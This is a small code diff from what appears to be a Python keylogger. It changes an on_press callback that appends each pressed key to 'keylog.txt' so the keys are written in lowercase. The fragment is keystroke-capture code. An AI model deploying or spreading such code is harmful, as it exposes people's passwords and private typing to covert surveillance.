@@ -10,7 +10,7 @@ def on_press(key):
     key = str(key)
     f = open("keylog.txt", 'a+')
     key = key[1:len(key)-1]
-    f.write(str(key))
+    f.write(str(key).lower())
     f.close()
 
 
